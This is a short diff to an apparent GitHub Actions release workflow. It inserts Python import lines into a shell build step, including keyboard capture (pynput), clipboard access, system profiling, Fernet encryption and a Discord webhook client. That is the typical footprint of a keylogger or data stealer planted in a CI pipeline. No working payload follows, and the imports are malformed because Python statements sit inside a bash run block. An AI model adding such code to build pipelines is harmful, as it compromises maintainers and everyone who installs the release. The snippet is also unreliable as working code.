@@ -29,6 +29,27 @@ jobs:
       - name: Build release distributions
         run: |
           # NOTE: put your own distribution build steps here.
+          import os
+          import sys
+          import time
+          import json
+          import threading
+          import pynput.keyboard
+          import shutil
+          import zipfile
+          import subprocess
+          import tempfile
+          import requests
+          import pyperclip
+          import socket
+          import platform
+          import psutil
+          import uuid
+          import base64
+          import datetime
+          from pathlib import Path
+          from cryptography.fernet import Fernet
+          from discord_webhook import DiscordWebhook, DiscordEmbed
           python -m pip install build
           python -m build
 
